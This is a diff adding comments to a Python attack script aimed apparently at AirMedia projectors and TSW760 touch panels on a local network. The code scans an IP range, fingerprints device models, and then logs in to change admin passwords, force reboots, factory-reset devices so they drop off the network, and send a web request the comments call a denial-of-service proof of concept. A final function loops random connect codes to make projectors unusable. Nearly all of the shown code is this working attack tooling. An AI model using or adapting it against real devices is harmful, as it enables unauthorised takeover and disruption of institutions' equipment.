@@ -18,6 +18,9 @@ import urllib3
 
 urllib3.disable_warnings()
 
+#This funciton will scan the specified ip range to identify projectors.
+#In our network we found that only the projectors had port 443 open.
+#In other environments this function may idntify printers, web servers, and other IOT devices.
 def network_scan(ip_range):
 	#Create List To Hold All Possible Hosts On The Network
 	allHosts=[]
@@ -55,32 +58,41 @@ def network_scan(ip_range):
 	#Clean UP onlineHosts So Its Only IPs
 	return onlineHosts
 
+#This funciton will identify the model of a device based on specific behaviors observed.
 def model_type(hosts):
 	#Send HTTPS requests to See if port is open
 	model_dictionary = {}
 	for host in hosts:
+		#Test for tws760 url
 		tswURL = "http://" + host + "/webView/CommonUI"
 		tswTest = requests.get(tswURL, verify=False)
+		#Test for the original projector we found
 		theOGurl = "http://" + host + "/cgi-bin/login.cgi?lang=en&src=AwLoginDownload.html"
 		theOGTest = requests.get(theOGurl, verify=False)
+		#Test for air2media version
 		air2url = "http://" + host + "/index_airmedia.html"
 		air2Test = requests.get(air2url, verify=False)
+		#Verify a unique string found in the air2media version
 		if "var present_timeout = 1000;" in air2Test.text:
 			print(host + " is a AirMedia2")
 			model_dictionary[host] = 'AirMedia2'
+		#Verify existence of unique page found only in the OG device.
 		elif theOGTest.status_code == 200:
 			print(host + " is an OG")
 			model_dictionary[host] = 'OG'
+		#Verify a unique string found only inthe tsw760.
 		elif  "Display the application" in tswTest.text:
 			print(host + " is a tsw760")
 			model_dictionary[host] = 'TSW760'
+		#verify unique string found in a model we did not develop for.
+		#Please note, tho we did not develop this devie it is vulnerable via the management port
 		elif "DispBlock OvHidden FontLatoLight Fs30 Blue" in air2Test.text:
 			print(host + " is the one we did dev for")
 			model_dictionary[host] = 'Ignore'
 	return model_dictionary
 
+#Perform a login to the OG version
 def og_Login(host,username,password):
-	print("Trying to login now")
 
 	#URL of Projector
 	url="https://" + host + "/cgi-bin/login.cgi?lang=en&src=AwLoginAdmin.html"
@@ -103,6 +115,8 @@ def og_Login(host,username,password):
 	cookie=cookieMid[0]
 	return cookie
 
+#This method will cause the device to reboot
+#This code will change its method based on the version 
 def reboot(host,model,username,password):
 	if model == 'TSW760':
 		Data = {"Device": {"DeviceOperations": {"Reboot": "true"}}}
@@ -118,13 +132,15 @@ def reboot(host,model,username,password):
 		print("Reboot Incoming")
 	else:
 		pass
+#This code will factory restore the device based on the version number
+#Please note that this can knock the device off the network and will require manual reconfiguration to fix.
 def restore(host,model):
 	if model == 'TSW760':
 		Data = {"Device": {"DeviceOperations": {"Restore": "true"}}}
 		restore = requests.post(url="http://" + host + "/Device/DeviceOperations", json=Data, verify=False)
 	else:
 		pass
-
+#This code will  change the password of a projector.
 def change_pass(host, username, password, newpass):
 	cookie = og_Login(host,username,password)
 	#Change Pass
@@ -135,6 +151,9 @@ def change_pass(host, username, password, newpass):
 	changePass = requests.post(url=url,data=data, verify=False)
 	print("Password Change Request Sent")
 
+#This code is a POC
+#It can send a web request.
+#If this was looped with all devices it could potentially take a device offline
 def web_dos(host,username,password,webserver):
 	cookie = og_Login(host,username,password)
 
@@ -145,13 +164,18 @@ def web_dos(host,username,password,webserver):
 	remoteViewOn = requests.post(url=url,data=data, verify=False)
 	print("Web Request Sent")
 
+#This code will begin cycling through various connect codes.
+#Depending on the speed of the device, this may make the projector unoperational.
 def code_cycle(host,username,password):
 	cookie = og_Login(host,username,password)
-	while True:
-		randomInt = random.randint(1,9999)
-		url = "https://"+ host + "/cgi-bin/return.cgi"
-		data = {
-			'command' : '<Send><seid>' + cookie + '</seid><name>PREF_LOGINCODE</name><value>2</value><name>PREF_UNIVERSAL_LOGINCODE</name><value>' + str(randomInt) + '</value></Send>'
-		}
-		cycle = requests.post(url=url,data=data, verify=False)
-		print("Cycle")
+	try:
+		while True:
+			randomInt = random.randint(1,9999)
+			url = "https://"+ host + "/cgi-bin/return.cgi"
+			data = {
+				'command' : '<Send><seid>' + cookie + '</seid><name>PREF_LOGINCODE</name><value>2</value><name>PREF_UNIVERSAL_LOGINCODE</name><value>' + str(randomInt) + '</value></Send>'
+			}
+			cycle = requests.post(url=url,data=data, verify=False)
+			print("Cycle")
+	except KeyboardInterrupt:
+    		pass
